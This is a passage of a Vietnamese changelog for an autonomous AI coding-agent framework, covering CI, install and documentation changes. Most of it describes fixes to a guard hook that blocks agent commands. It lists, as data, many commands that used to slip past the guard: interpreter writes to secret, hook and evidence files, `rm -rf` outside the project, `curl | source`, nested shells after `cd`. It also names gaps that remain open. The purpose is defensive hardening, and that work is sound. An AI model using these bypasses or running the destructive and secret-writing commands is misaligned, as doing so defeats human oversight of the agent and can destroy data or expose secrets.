(`--no-tick` để tự tay — D-113, T-1719; giữ nguyên CRLF và quyền file, `write_atomic(keep_mode=True)`). `install.py` cài lại cùng bản không in dòng "Bước làm tay … không có". `release-check` dùng lại kết quả `loop verify --all` trên cùng cây (dấu vân tay khớp) thay vì chạy lại mọi `— Kiểm:` của blueprint (T-1720). `dev-task.sh gate`/`gate-fast` hỏi guard MỘT lần cho mọi lệnh của lượt (`xt.py guard-check --stdin`, các lệnh cách nhau bằng NUL nên lệnh nhiều dòng của `project-commands.sh` tới guard nguyên vẹn, mỗi guard nạp một lần; một lệnh bị cấm → exit 126, không chạy lệnh nào — LOOP-STOP-027 giữ nguyên; chỉ bỏ hỏi lại khi lệnh còn y nguyên lúc chạy; `xt.py` cũ không biết `--stdin` → hỏi từng lệnh như trước; trước: một tiến trình Python mỗi lệnh, T-1715). `xt.py guard-check`/`guard_block` và `autonomy-bench` biên dịch `guard.py` từ byte nguồn (`compile` + `exec`), không đọc lẫn ghi `__pycache__` — pyc độc khớp mtime/size của nguồn không còn thay được guard (AUD-SEC-074 mở rộng sang xt.py; test `GuardCheckSourceLoadTest`, T-1716). `doctor` khi khung cài đã cũ chỉ bảo chạy lại `install.py` (lệnh này in bước "Dự án đích"; CHANGELOG không được cài vào dự án đích). `tests.test_hooks.CommitGateFastHookTest` (29,3 s, chặn đường găng CI) tách thành `CommitGateFastConfigChangeTest`/`CommitGateFastHookTest`/`CommitGateFastNoVerifyTest` (≤ 18,2 s mỗi lớp; `tests/shard-weights.json` thêm `ShardPlanTest` — T-1717). `install.py` (D-114, T-1732): file gốc `AGENTS.md`/`CLAUDE.md`/`PROGRESS.md`/`xt.yaml` có hash trong manifest như harness — chưa sửa → cập nhật tại chỗ, đã sửa mà mẫu không đổi → `kept-own` (im lặng), đã sửa và mẫu đổi → `.xtemplates-new` MỘT lần (harness/GitHub `updated-new` cũng ghi hash mẫu mới); dự án đã cài bản chưa có hash file gốc được suy hash từ `.xtemplates/framework/templates/*` cũ; nâng bản in các bước "Dự án đích" của CHANGELOG khung giữa bản đã cài và bản mới; `xt.yaml` của dự án nhận khoá mới của mẫu dạng chú thích `# khoá: mặc định` (vắng khoá = hành vi cũ). Dự án đích: chạy lại `install.py` (hook/dev-task cập nhật tại chỗ nếu chưa sửa; lần này file gốc chưa sửa cũng cập nhật tại chỗ).
- Tài liệu vận hành theo "một chủ đề một nhà" (PLAN-3.12 Lát 1, D-111): `AGENTS.md` 13,6 KB → 7,2 KB và mẫu `framework/templates/AGENTS.md` 15,9 KB → 8,2 KB (9 mục giữ tên; mỗi luật một câu + "cưỡng chế bởi <hook/lệnh>" + link nhà; bỏ giá trị cấu hình văn xuôi — nguồn thật là `xt.yaml`; thêm câu "không thay cho hook/permission" — `XC-DOCAI-001/004/006/014` tick kèm `— Kiểm:`); `CLAUDE.md` 5,5 KB → 1,6 KB và mẫu → 1,9 KB (danh sách guard → tóm tắt theo nhóm, nhà ở `stop-points-and-escalation.md`); skill `/autopilot` 17,5 KB → 6,0 KB (checklist, máy in bước kế — không chép lại output `doctor`/`loop status`/`pr next`/Stop hook) và `framework/11-autonomous-loop/README.md` 20 KB → 10,7 KB (bỏ bảng lệnh — nhà là README gốc §Công cụ); 7 skill + 5 subagent hết mâu thuẫn (cổng commit = hook `gate-fast`, `/gate` = cổng đầy đủ trước PR; reviewer khác **họ** model, chỉ khi `pr next` trả `review`; `/audit` tự duyệt kế hoạch sửa; `executor-deep`/`reviewer-alt` chỉ ghi phần khác `executor`/`reviewer`); `lifecycle.md`/`conventions.md`/`session-start.sh` (đường dẫn theo repo, đúng 4 mục PROGRESS) khớp ADR-0033; lý do Stop hook ngắn, nhịp đẩy theo lát, lệnh `xt.py` đúng repo (`xt_cmd`); trích dẫn `Nguồn: AGENTS.md` trong 7 mục module theo tên mục thay số. Đầu phiên repo khung nạp ≈ 27,8 KB → ≈ 17 KB; gọi `/autopilot` thêm 37,5 KB → 16,7 KB. **Dự án đích: chạy lại `install.py`** (mẫu AGENTS/CLAUDE copy-if-absent — tự chép phần luật mới nếu đã điền; skill/agent/hook cập nhật tại chỗ nếu chưa sửa).
- Autopilot tối giản ở pha build ([ADR-0033](docs/adr/0033-build-phase-lean-autopilot.md), D-110): `loop status` kèm `milestone_audit` khi báo `milestone_done` — `g7` ở `delivery_phase: build` (không audit delta theo mốc, gom về trước G7; `release-check` hàng `phase`/`review_debt` vẫn chặn phát hành), `now` ở harden (ADR-0029 như cũ); skill `/autopilot` bước 10 viết lại theo `pr next`: giao reviewer **chỉ khi** `pr next` trả `review` (mọi pha — PR làn nhanh và PR làn chuẩn pha build không còn được giao reviewer mặc định), `PROGRESS.md` cập nhật theo lát (commit cuối của lát, trước cổng đầy đủ) thay vì sau mỗi task; `xt.yaml` không đọc được ở ranh giới mốc → `now` (không vỡ `loop status`). Giữ: cổng đầy đủ một lần trước khi đẩy, tắt auto-merge trước mỗi push. ADR-0029/0031 đổi dòng trạng thái. Test `test_milestone_done_marks_section_transition`. Dự án đích: chạy lại `install.py` (nhận `xt.py`, skill `/autopilot`).
- Repo khung chuyển `delivery_phase: harden` → `build` (D-109, chủ repo 2026-10-20): PR làn chuẩn merge khi CI xanh, không chạy `reviewer`, nợ review ghi lại; `release-check` vẫn FAIL hàng `phase`/`review_debt` tới khi đặt lại `harden` ở giai đoạn hoàn thiện (ADR-0031). Test `test_delivery_phase_template_and_framework_repo_build`. Dự án đích: không ảnh hưởng.
- [ADR-0032](docs/adr/0032-merge-check-review-verdict.md) thay ADR-0028 §2 (D-099): `merge-check` trả verdict `review` (exit 1, không gợi lệnh merge ghim head) khi CI/làn cho merge mà review ở head chưa hợp lệ (`eligible` false); ADR-0028 đổi dòng trạng thái, nội dung giữ nguyên. Hành vi đã có ở mục Fixed (AUD-XFEAT-010).
- `dev-task.sh test-shard` chia theo trọng số khi `xt.yaml` khai `test_weights` (D-095; `WF-CI-024` mức không đổi, nêu thêm cách chia này): `xt.py test-shard-plan I N --weights FILE` chia tham lam LPT (lớp nặng trước, vào shard nhẹ nhất; lớp chưa có trọng số lấy trung vị; file vắng → mọi lớp cùng trọng số = `k mod N`; JSON hỏng/giá trị không phải số giây ≥ 0 → exit 2); `dev-task.sh test-weights` (= `xt.py test-weights --unit CMD --out FILE`) đo lại từng lớp nối tiếp có coverage, ghi JSON khoá sắp xếp, lớp đỏ → không ghi — chạy tay, CI không chạy. Repo khung commit `tests/shard-weights.json`: 4 shard từ 63/58/80/164 s tổng trọng số (`k mod N`) còn 91/91/91/92 s. Không khai `test_weights` → hành vi cũ. Dự án đích: không bắt buộc (chạy lại `install.py` để nhận `dev-task.sh`/`xt.py` mới nếu muốn khai `test_weights`).
- Tách lớp test nặng để shard CI không bị một lớp chặn (mỗi lớp một tiến trình): `MergeGuardTest` → lớp gốc `MergeGuardBase` + `MergeGuardTest`/`MergeGuardPinnedMergeTest`/`MergeGuardHardUnpinnedTest`/`MergeGuardFailClosedTest`; `EvidenceHooksTest` → `EvidenceHooksBase` + `EvidenceHooksTest`/`TaskCompletedHookPassTest`/`EvidenceHooksStopInstallTest`; mẫu cặp của `GuardCorpusTest` (4000) và bảng `find` của `GuardRemainingGapsTest` chia theo chỉ số cho 4 lớp `GuardCorpusPairsPart*Test`/`GuardFindAutopilotPart*Test`, bảng ca `DevTaskWeightedShardTest` cho 2 lớp `DevTaskWeightedPartitionPart*Test` — giữ tên phương thức test, `GuardCorpusPartsTest`/`test_partition_case_parts_cover_table` khẳng định hợp các phần == bảng đầy đủ (1090 → 1100 test); `tests/shard-weights.json` đo lại: lớp nặng nhất 36,4 → 14,2 s, shard chậm nhất 52,3 → 35,5 s (đo cùng máy).
- `install.py --with-github` cài thêm `.github/workflows/ci.yml` và `secret-scan.yml` từ mẫu (copy-if-absent; AUD-CI-003 cập nhật: mọi workflow cài sang đều không phụ thuộc stack), ghi hash file `.github/` vào `.xtemplates/manifest.json` — chỉ khi file đích đúng bằng bản khung, file của dự án khác bản khung không được ghi hash (file chưa sửa được cập nhật tại chỗ ở lần cài sau; `doctor --drift` thấy file đã sửa/thiếu); cảnh báo ruleset chỉ còn nêu required check chưa có job (`dep-audit`) thay vì cả bốn; `--plan` liệt kê hai workflow mới.
- CI song song hoá theo mô hình fan-out/fan-in (**`WF-CI-024`** mới, SHOULD; `WF-CI-001` mức không đổi, ghi rõ `always()` thay `!cancelled()`): `ci.yml` tách cổng nối tiếp `gate` thành job `build` · `typecheck` · `lint` (mỗi job gọi đúng `scripts/dev-task.sh <task>`), `test` 4 shard theo lớp có coverage + job `coverage` gộp dữ liệu các shard (artefact) và đòi đúng ngưỡng 100 % như `xt.yaml` `test`; `py311` 3 shard trên nhánh tên `main`; `checks` thêm `setup-python` 3.13 và nhận `autonomy-bench`. `dev-task.sh` thêm `test-shard I N [DIR]` và `test-combine DIR` (đọc khoá mới `test_list`/`test_unit`/`test_combine` của `xt.yaml`; shard rỗng, `test_list` đỏ hoặc ít hơn `XT_MIN_TESTS` id → đỏ; qua guard như lệnh khác); `gate`/`gate-fast`/`test` giữ nguyên. Job `quality` thành job TỔNG HỢP `if: always()` `needs` mọi job con, đỏ khi bất kỳ kết quả ≠ `success` — đóng lỗ `!cancelled()`: run bị huỷ làm `quality` thành `skipped` mà GitHub tính required check đạt (auto-merge có thể merge mã chưa qua test). Ruleset không đổi (vẫn 5 required check). `tests/test_ci.py` giữ không trôi (mọi task của `gate` có job, `quality.needs` đủ, hợp các shard == tập lớp của discover). Dự án đích: nhận cùng mô hình qua mẫu `framework/templates/ci.yml` khi chạy lại `install.py --with-github` (xem mục Added; workflow của repo khung không cài sang; `dev-task.sh` có thêm hai lệnh con, chỉ chạy khi gọi).
- Tên phiên `<Tên repo> — <tên nhánh>` (`LOOP-HARNESS-028`, mức SHOULD giữ nguyên vì `harness-files.md` đã đủ 4 MUST ở quy mô M) trở thành bước bắt buộc của quy trình: skill `/autopilot` Bước 0 đặt tên phiên trước `doctor` (bullet tên phiên lên đầu; đang ở `main` thì tạo nhánh trước; tên phiên để danh sách phiên cho biết phiên nào giữ nhánh/PR nào — bỏ câu sai về Stop hook); `AGENTS.md` và mẫu `AGENTS.md` ghi "bắt buộc, đặt ngay đầu phiên". **Dự án đích:** chạy lại `install.py` (skill `/autopilot`; `AGENTS.md` copy-if-absent — tự chép dòng Tên phiên).
- Test dọn thư mục tạm: các `tempfile.mkdtemp()` không được dọn trong `tests/test_hooks.py`, `tests/test_guard_corpus.py`, `tests/test_install.py`, `tests/test_xt.py` chuyển sang `enterContext(tempfile.TemporaryDirectory())` (`enterClassContext` cho `setUpClass`) — mỗi lần chạy suite không còn để lại hàng trăm thư mục trong `/tmp` (chính thứ làm guard chậm, D-097). `.gitignore` thêm `.claude/worktrees/` (bản sao repo của subagent).

### Fixed
- Guard: script trình thông dịch có sẵn byte `\x01N\x02` (trùng dấu che chuỗi của bộ che D-107) không còn làm guard
  ném IndexError rồi fail-open cả dòng lệnh (AUD-SEC-091 🔴, hồi quy #186, audit delta 2026-10-20 lần 2): script có byte
  dấu che là không chỉ đọc, `_ro_lit` kiểm chỉ số. Trước đây `node -e "require(<0x01>9<0x02>);'.env'"; gh repo delete …`
  được cho chạy.
- Guard: quét chuỗi đường dẫn canh trong script không còn bậc hai (AUD-SEC-092, hồi quy #185/#186): script không có dấu
  hiệu API ghi (`WRITE_ANY_RE`) bỏ hẳn regex theo từng chuỗi; có dấu hiệu mà nhắc hơn `DIRECT_PROBES` = 64 chuỗi canh thì
  coi như ghi (fail-closed). 3.200 chuỗi: 62 s → < 1 s.
- Guard: script trình thông dịch được trích ở cờ gộp/dính (`python3 -Ic`, `-c"…"`, `-Sc`, `node --eval=…`, `node -p"…"`,
  `php -nr`, `perl -e'…'`, `ruby -e'…'`), tên `nodejs`/`python3.13t`, và sau lệnh chạy hộ (`uv/poetry/pdm/pipenv/hatch/
  rye/conda/pixi run`, `pipx run`, `uvx`, `npx`, `npm exec`, `bunx`; tối đa 8 lớp) — trước đây cả quét `os.system`/
  `execSync` lẫn D-105 bị bỏ qua (AUD-SEC-093). Nguồn lồng sau `cd` (`$(…)`, backtick, `<(…)`, `script -c`, `flock`,
  `watch`, `busybox sh`, `su -c`, heredoc vào shell, ống giải mã) dùng chung MỘT danh sách với lượt quét gốc nên được quét
  ở thư mục đã đổi (AUD-SEC-094, phần sót của AUD-SEC-087). `~+`/`~-` (bash mở thành `$PWD`/`$OLDPWD`) không còn bị coi là
  thư mục con: ghi tay `.autopilot/` qua `~+/…` bị chặn, `~-` là thư mục không biết (D-106) (AUD-SEC-097). `source`/`.`
  với `/dev/stdin`/`/dev/fd/0` quét như `bash <<<`; `curl … | source /dev/stdin` chặn như `curl | sh` (AUD-SEC-098).
- Guard: `rm -rf $PWD/..`, `rm -rf ~+`, `rm -rf ~-/x` bị chặn như `rm -rf ..` (AUD-SEC-099 🔴): `_outside_project` coi
  mọi `$…` là không rõ nên cho qua — nay `$PWD`/`~+` là thư mục đang đứng, `~-`/`$OLDPWD` là ngoài dự án; đích `rm`
  chuẩn hoá `..`. Review #187: `$(pwd)`/`` `pwd` `` không nháy (tokenizer từng tách thành 5 token) được thay bằng `$PWD`
  trước khi tách; lệnh chạy hộ dò hết token cờ (trần 6 từng bỏ sót `uv run --with a --with b --with c python …`, trần 64 vẫn né được); giới hạn
  còn lại ghi ở AUD-SEC-101. **Dự án đích:** chạy lại `install.py` (guard đổi).
- `docs/ops/AUTONOMY-BASELINE.md` §3 đo lại: 438 ca, guard 308, phủ 88/144 (AUD-DOC-072); `tests/shard-weights.json`
  đo lại 216 lớp (AUD-TEST-017).
- `merge-check`/`pr next`/`pr reviewed`: sổ review cục bộ hỏng (`reviews` không phải list) bị bỏ qua thay vì văng
  traceback (AUD-CODE-019); hai bản ghi cùng giây ở cùng head lấy bản ghi sau trong sổ, khớp `pr next` (AUD-XFEAT-018).
  Test hook cho xt.py lỗi cú pháp/exit ≠ 0/vắng → cổng commit đầy đủ (AUD-TEST-016).
- Ghi giới hạn đã biết của guard (audit delta 2026-10-20 lần 2, `framework/11-autonomous-loop/harness-files.md`): thư
  mục tính theo thứ tự chữ không theo luồng chạy — hàm/vòng lặp/`trap` (AUD-SEC-095); đổi thư mục trong script và đường
  dẫn qua argv (AUD-SEC-096); `merge-check` so giờ sổ cục bộ với giờ GitHub (AUD-XFEAT-019); chặn oan script nạp module
  hàng rào (AUD-HAR-100); phạm vi hở thật của AUD-SEC-086 (bí mật từ biến môi trường/đường dẫn ghép, AUD-DOC-073).
- Guard: review PR #186 lần 3 (AUD-SEC-088/089/090) — script Python: literal lấy thêm từ AST (hằng str/bytes, phần hằng của f-string, escape đã giải) hợp với regex, và chuỗi giữa hai nháy bất kỳ (chồng lấn) nên f-string cùng nháy của 3.12+ (`f"{open(".env","w")}"`, lồng tới độ sâu 3) và `'\x2eenv'` không còn giấu đường dẫn được canh; script trình thông dịch chuẩn hoá NFKC trước khi che/quét/trích (`os.ｒemove`, `Path(…).ｗrite_text`, `os.ｓystem` toàn-rộng); redirect `<>` (`exec 3<> .env`, `1<> .env`) là ghi; nhận thêm `deno eval`, `lua -e`, `tclsh` (stdin, `-c`), `pypy`/`pypy3`, `ipython -c` (pypy/ipython thuộc họ python; Lua `--`/`[[…]]` là không chỉ đọc); `env` nhận viết tắt duy nhất của tuỳ chọn dài (`--ch=DIR` → `--chdir`); magic chạy shell của ipython (`!cmd`, `!!cmd`, `x = !cmd`, `%sx`, `%system`, ô `%%bash`/`%%sh`/`%%script <shell>`) quét như `sh -c` (`ipython -c '!rm -rf ~'` bị chặn), magic lạ fail-closed (từ trên dòng magic là ứng viên đường dẫn: `%%writefile .env` bị chặn). Còn hở (AUD-SEC-090): đường dẫn ghép chuỗi; Tcl không cần nháy (`file delete .env` không bị xét); escape trong chuỗi node/ruby/perl chưa được giải. Chặn oan mới đã biết: deno/lua/tclsh đọc file canh bằng API riêng (`Deno.readTextFileSync`, Lua `f:read`); `ipython -c` có magic nhắc file canh. Test `Review3Test`, `IpythonMagicTest` (`tests/test_guard_review186.py`), ca bench `guard-review186r3-*`.
- Guard: review PR #186 lần 2 (AUD-SEC-088/089, D-105, D-106, D-107) — bộ che chuỗi/comment của `_read_only_script` lệch được (comment giả có nháy ba `x = 4 / 2 # '''` giấu `os.open('.env', 513)`; Perl `qq{ # }`, `m{ #}` giấu `sysopen`) nay fail-closed: Python che bằng `tokenize` (ERRORTOKEN/TokenError/cú pháp sai → không chỉ đọc, biểu thức f-string kiểm đệ quy tối đa 3 tầng, chỉ khi mọi trình thông dịch trong lệnh là Python); node/ruby/perl/php chỉ che chuỗi một dòng, phần mã còn `#`, `/`, `%`, `<<`, quote-like Perl, nháy dính biến, chuỗi nháy kép có `$`/`@`, chuỗi `'|lệnh'` → không chỉ đọc (D-107). `open` chỉ đọc khi ≤ 2 đối số vị trí (Perl `open(F, '<', p)` 3 đối số), từ khoá chỉ `encoding`/`errors`/`newline`/`mode` đọc (`open('.env','r',-1,None,None,None,True,os.truncate)` từng lọt); `os.path.<hàm>` chỉ nhận đúng bên nhận `os.path` và danh sách hàm (`os.path.os.rmdir` từng lọt); hàm nhận hàm gọi lại: Node `fs.stat/lstat/exists/read/close` tối đa 1 đối số, `ConfigParser()` không đối số, Ruby `mode:` là không chỉ đọc. `cd`/`pushd` tới glob (`cd .cl*`) → thư mục không biết; `env -C DIR`/`--chdir[=]DIR`/`-iCDIR` dời thư mục của lệnh sau `env`; `dd of=<đích>` là đích ghi; lệnh chỉ gồm chuyển hướng (`exec 3> .env`, `> .env`) vẫn xét đích ghi. Bớt chặn oan: `.get`/`.keys`/`.values`/`.items` (`.get` không tính khi script nhắc thư viện mạng), `sorted`/`min`/`max` không `key=`, `os.listdir`/`scandir`/`walk` (không `onerror=`), `Path.glob`/`rglob`/`iterdir`, `ast.parse`, `hashlib.sha256`/`md5` + `.update` (chỉ Python)/`.hexdigest`, `json.dump(x, sys.stdout)`, f-string có biểu thức chỉ đọc. D-105 kích hoạt theo chuỗi nguyên văn: đường dẫn ghép hay escape đứng riêng không bị bắt (AUD-SEC-090). Chặn oan mới theo D-107: script node/ruby/perl/php nhắc đường dẫn được canh mà có comment/phép chia/`%`/heredoc/chuỗi nhiều dòng; `open(p, 'r', -1)`. Ca cũ đổi kết quả: `_read_only_script("open('.env', 'r', -1)")` nay False; `x = 1 / 2 # ; os.remove('.env')` với Python là comment thật nên chỉ đọc (với node thì không). Ca bench `guard-control-sec083-read-git-config` → `guard-sec083-read-git-config-write-other`, `guard-control-sec084-mention-env` → `guard-sec084-mention-env-write-other` (kỳ vọng chặn nên bỏ chữ "control"); ca mới `guard-review186-*` (tái hiện) và đối chứng `guard-control-review186-*`; test `tests/test_guard_review186.py` (`MaskFailClosedTest`, `OpenArgsTest`, `CdGlobEnvDdExecTest`, `ReadOnlyAllowlistTest`). Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Guard: thư mục guard không giải được không còn bị coi là gốc dự án (D-106, AUD-SEC-088, review PR #186 lần 1): cờ ghép `cd -LP`/`-Pe@` được hiểu như cờ đứng riêng; chuyển hướng đặt đầu lệnh (`2>/dev/null cd .claude`, `>/dev/null rm …`) bị bỏ trước khi nhận lệnh; có `CDPATH` (môi trường, `CDPATH=… cd x`, `CDPATH=…;`/`export CDPATH` trước đó) thì `cd` tương đối là không biết. Sau `cd`/`pushd` không biết (`cd "$X"`, `cd -`, `pushd +N`, `popd`, CDPATH) đích ghi tương đối của lệnh sau — đường shell, script trình thông dịch, shell lồng — được thử ở gốc và `.claude`, `.claude/hooks`, `.autopilot`, `.git`, `.git/hooks`; trúng chỗ nào chặn theo mã chỗ đó (chỉ tính khi file đã có hoặc tên là tên được canh ở đó). Chặn oan đã biết: `cd "$X" && echo x > config` (hay `> settings.json`, `> verified.json`, tên git hook, tên file đã có trong `.claude/hooks`) bị chặn dù `$X` là thư mục thường. Test `tests/test_guard_review186.py`; ca bench `guard-sec088-cd-combined-flags*`, `-redirect-before-cd`, `-cdpath-*`, `-cd-unknown-*`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Guard: script trình thông dịch nhắc đường dẫn được canh mà không chỉ gồm thao tác đọc thì bị chặn — mặc định chặn thay cho liệt kê API ghi (D-105, AUD-SEC-089, review PR #186 lần 1 còn lọt `os.open(p, 577)`, `fs.openSync(p, 1)`, `fs.rename`/`cpSync`/`truncateSync`, Ruby `File.rename`/`delete`/`binwrite`, `FileUtils.cp`/`mv`, Perl `rename`/`File::Copy`, PHP `copy`/`rename`, `tarfile.extractall`, `sqlite3.connect`, `os.utime`, `os.makedirs`, `logging.FileHandler`). Script `-c`/`-e`/`-r`, heredoc, here-string, ống vào trình thông dịch có chuỗi là hàng rào/`.git/hooks`/`.git/config`/bí mật/`.autopilot/` → `HOOK_BYPASS`/`SECRET_WRITE`/`EVIDENCE_HANDWRITE`, trừ khi toàn script thuộc danh sách đọc (`open` mode `r`/`rb`, `.read*()`, `Path(…).read_text/read_bytes/exists/is_file/stat`, `.open()`/`.open('r')`, `os.path.*`, `os.stat`, `json.load(s)`, `print`; Node `readFileSync`/`existsSync`/`statSync`/`lstatSync`/`createReadStream`; từ khoá, import, gán biến). Tên trong danh sách bị gán lại (`from os import remove as print`, `{unlinkSync: open}`), gọi trên biểu thức, hàm gọi lại (`JSON.parse(t, fs.unlinkSync)`), f-string/nội suy có biểu thức, backtick, `require('./x')` đều tính là không chỉ đọc. **Chặn oan đã biết** (trước là đối chứng cho qua, nay chặn): script vừa đọc `.env` vừa gọi `requests.get`; đọc `.git/config`/hook rồi ghi file khác (`open('out.txt','w').write(open('.git/config').read())`); script sửa tài liệu/ghi file khác có chuỗi `'.env'`/`'.claude/hooks/guard.py'` đứng riêng (`print('.env'); open('out.txt','w')…`, `p.write_text(p.read_text().replace('.claude/hooks/guard.py', …))`); đọc bằng hàm ngoài danh sách (`dict.get`, `sorted`, `min`/`max`, hàm tự viết, PHP `fopen`, Perl `-e '.env'`); `sys.path.insert(0, '.claude/hooks')` để import guard; JS template string. Ca bench `guard-control-sec083-read-git-config`, `guard-control-sec084-mention-env` đổi kỳ vọng sang chặn (origin `audit`); test cũ đổi tương ứng ở `test_guard_audit1020.py`, `test_hooks.py`. Ca bench mới `guard-sec089-*` và đối chứng `guard-control-sec089-*`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Guard: `cd`/`pushd` kèm chuyển hướng hoặc cờ vẫn dời thư mục (AUD-SEC-088, review PR #185): `cd .claude 2>/dev/null`, `cd .claude >/dev/null`, `pushd .claude >/dev/null`, `cd -P|-L|-e|-- .claude` (cờ đứng riêng) trước đây làm guard mất thư mục nên `cd .claude >/dev/null && bash -c 'echo x > settings.json'` cho qua; nay bỏ chuyển hướng và cờ trước khi lấy đích (cờ lạ, `cd -`, `pushd +N` là không biết — xem mục D-106 ở trên). Ca bench `guard-sec088-*`.
- Guard: script trình thông dịch ghi đường dẫn được canh qua API còn sót bị chặn như đường shell `ln -s`/`chmod`/`cp` (AUD-SEC-089, review PR #185): `fs.createWriteStream`, `os.open` với cờ ghi, `open`/`fs.openSync` mode ghi, `os.symlink`/`os.link`/`os.chmod`, `fs.symlinkSync`/`chmodSync`, `Path(…).open('a'|'w')` vào `.git/config`, `.git/hooks/*`, hàng rào, bí mật, bằng chứng. Đọc (`os.O_RDONLY`, `Path.open()`/`'r'`, `openSync(…, 'r')`) vẫn chạy. Ca bench `guard-sec089-*`.
- `merge-check`: review cục bộ chưa kết luận (`inconclusive`) cho `review: missing` thay vì `blocking` — thông điệp "còn lỗi chặn" trước đây sai; PR vẫn không hợp lệ (`eligible: false`).
- Ghi giới hạn đã biết của phân tích tĩnh trong guard (AUD-SEC-090) vào mục "Giới hạn đã biết của guard và hook" (`framework/11-autonomous-loop/harness-files.md`): đường dẫn ghép chuỗi/f-string/`os.path.join`; `.GIT/config` trên hệ file không phân biệt hoa thường; `.git/info/exclude` (phần tử list/dict và `cd "$PWD/…"` đã phủ trong cùng đợt — D-105/D-106, AUD-DOC-075).
- Ghi giới hạn đã biết, không sửa mã (audit delta 2026-10-20): mục mới "Giới hạn đã biết của guard và hook" trong `framework/11-autonomous-loop/harness-files.md` — guard không xét gửi bí mật ra mạng bằng thư viện của trình thông dịch (`urllib`/`socket` trong `python3 -c`, `fetch` trong `node -e`; AUD-SEC-086) và `subagent-stop.sh` chỉ khớp mẫu chữ "exit/rc + số" nên lọt và bắt sai được (AUD-HAR-098); `loop-design.md` trỏ tới mục này.
- Tài liệu chặn merge thiếu review (AUD-DOC-068, audit delta 2026-10-20): sau AUD-HAR-093 guard chặn MỌI dạng merge (ghim head hay không, `gh api …/merge`, tool MCP merge) và bật auto-merge PR làn chuẩn chưa có review sạch ở head (`REVIEW_MISSING`; pha `build` hoãn review nên không chặn). `CLAUDE.md` thôi ghi "merge ghim head" như phạm vi chặn duy nhất; mẫu `framework/templates/CLAUDE.md` bỏ câu "merge … khi `xt.py merge-check` không cho — lớp đỡ là CI/ruleset nhánh" (nay chỉ lý do ngoài review và ngoại lệ cứng mới cho chạy); `AGENTS.md` và mẫu `AGENTS.md` thêm điểm chặn này vào nhóm "Máy chặn". Dự án đích: `CLAUDE.md`/`AGENTS.md` là copy-if-absent — tự chép câu mới.
- Guard: shell lồng sau `cd`/`pushd` được quét với thư mục của chính lệnh đó (AUD-SEC-087, audit delta 2026-10-20 — chỗ hở ghi ở mục AUD-SEC-085 dưới đây): `cd .claude && bash -c "echo x > settings.json"` bị chặn `HOOK_BYPASS`, `cd .autopilot && echo 'echo {} > verified.json' | sh` bị chặn `EVIDENCE_HANDWRITE` — như `echo x > .claude/settings.json`. `_scan_nested` thêm lượt quét theo thư mục (`_moved_nested_scripts`, dựa trên `_commands_with_cwd`) cho `sh -c`, `eval`, here-string/ống/heredoc vào shell, lệnh bọc trên máy và `os.system` trong script trình thông dịch; tập script đã quét khoá theo (script, thư mục) để cùng chuỗi ở thư mục khác vẫn được quét. `cd docs && bash -c "echo x > a.md"` vẫn chạy. Test `NestedCwdTest`; ca bench `guard-sec087-*`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Guard: script trình thông dịch ghi file hàng rào/bí mật/bằng chứng qua biến hoặc bí danh bị chặn như ghi trực tiếp (AUD-SEC-084, audit delta 2026-10-20). Trước đây `python3 -c "f='.env'; open(f,'w')…"`, `p='.claude/settings.local.json'`, `f='.autopilot/verified.json'`, `from pathlib import Path as P; P('.claude/hooks/guard.py').write_text(…)`, `p = Path(…); p.write_text(…)`, node `writeFileSync(f,…)`, perl `open(my $h,'>',$f)` chỉ là ask thường mà chính sách mặc định cho qua. Nay biến được gán chuỗi đường dẫn (`x = '…'`, `x = Path('…')`, `const`/`let`/`my`, `for f in ['…']`, gán lại `b = a`) và là đối số ĐƯỜNG DẪN của lời gọi ghi/xoá (`open(x,'w')`, `x.write_text(`, `os.remove(x)`, `shutil.copy(a, x)`, `writeFileSync(x,…)`, `File.write(x`, `file_put_contents($x`, perl `open(F, ">$x")`) → `HOOK_BYPASS`/`SECRET_WRITE`/`EVIDENCE_HANDWRITE`; hàm bọc bất kỳ quanh chuỗi rồi `.write_text(`/`.unlink(`… cũng tính. Không chặn oan (ca đối chứng có test): biến chỉ được đọc/in ra, hay là NỘI DUNG ghi vào file khác (`writeFileSync('out', 'x' + f)`, `p.write_text(s.replace(old, …))`). Chặt hơn trước: biến gán từ biểu thức có chứa chuỗi đường dẫn (`x = foo('.env')`) rồi làm đường dẫn ghi cũng bị chặn. Còn hở: đường dẫn ghép chuỗi/format, nằm trong dict hay đi qua hàm tự viết. Test `-k guard_interp_alias_write`; ca bench `guard-sec084-*`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Guard: đích ghi của script trình thông dịch tính từ thư mục lệnh đang đứng (AUD-SEC-085, audit delta 2026-10-20): `cd .claude && python3 -c "open('settings.local.json','w')…"` bị chặn `HOOK_BYPASS`, `cd .autopilot && python3 -c "open('verified.json','w')…"` bị chặn `EVIDENCE_HANDWRITE` — như đường shell (`cd .claude && echo x > settings.json`). `interp_write_asks` nhận `cwd` của phiên và theo `cd`/`pushd`/subshell qua `_commands_with_cwd`; thân heredoc tính theo thư mục của lệnh trình thông dịch đọc stdin. Test `-k guard_interp_cwd`; ca bench `guard-sec085-*`. Còn hở (ghi nhận, ngoài phạm vi, cả đường shell): shell lồng sau `cd` (`cd .claude && bash -c "echo x > settings.json"`) quét với thư mục ban đầu. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Guard: script trình thông dịch ghi `.git/config` hoặc `.git/hooks/*` bị chặn `HOOK_BYPASS` như `echo x >> .git/config` (AUD-SEC-083, audit delta 2026-10-20). Trước đây `interp_write_asks` không có nhánh cho `GIT_HOOK_PATTERNS` nên `python3 -c "open('.git/config','a')…"`, `node -e "…appendFileSync('.git/config',…)"`, perl/ruby và heredoc `python3 - <<'PY'` lọt hẳn (không cả hỏi). Chỉ chặn khi đường dẫn là đối số của chính lời gọi ghi/xoá; đọc `.git/config` vẫn chạy. Test `-k guard_interp_git_config`; ca bench `guard-sec083-*`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
